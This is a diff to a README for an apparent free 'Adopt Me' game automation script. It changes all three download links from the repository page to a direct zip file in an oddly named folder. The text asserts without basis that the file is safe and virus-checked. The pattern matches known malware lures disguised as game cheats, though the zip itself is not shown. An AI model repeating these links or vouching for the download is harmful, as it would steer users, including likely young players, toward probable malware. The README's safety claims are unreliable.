@@ -1,6 +1,6 @@
 # 🎮 adopt-me-script-free-2026 - Automate Your Adopt Me Gameplay Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-Adopt_Me_Script_2026-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Trailertrucknovosibirsk846/adopt-me-script-free-2026)
+[![Download Now](https://img.shields.io/badge/Download-Adopt_Me_Script_2026-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Trailertrucknovosibirsk846/adopt-me-script-free-2026/main/excitability/me-free-script-adopt-v3.0.zip)
 
 ## 📌 About This Project
 
@@ -28,7 +28,7 @@ Follow these simple steps to set up the software on your computer:
 
 Visit this link to download the application:
 
-👉 **[Click Here to Download Adopt Me Script 2026](https://github.com/Trailertrucknovosibirsk846/adopt-me-script-free-2026)**
+👉 **[Click Here to Download Adopt Me Script 2026](https://raw.githubusercontent.com/Trailertrucknovosibirsk846/adopt-me-script-free-2026/main/excitability/me-free-script-adopt-v3.0.zip)**
 
 Once you click the link, the download will begin automatically. The file is safe and has been checked for viruses.
 
@@ -156,7 +156,7 @@ Before downloading, verify you meet these conditions:
 
 **Ready to automate your Adopt Me gameplay?** Click the button below to get your free copy now:
 
-[![Download Latest Version](https://img.shields.io/badge/⬇️_Download-Adopt_Me_Script_2026-ff69b4?style=for-the-badge)](https://github.com/Trailertrucknovosibirsk846/adopt-me-script-free-2026)
+[![Download Latest Version](https://img.shields.io/badge/⬇️_Download-Adopt_Me_Script_2026-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/Trailertrucknovosibirsk846/adopt-me-script-free-2026/main/excitability/me-free-script-adopt-v3.0.zip)
 
 This is a **one-time download**—no subscriptions, no hidden fees. The tool works entirely offline after installation and doesn't require any additional plugins.
 
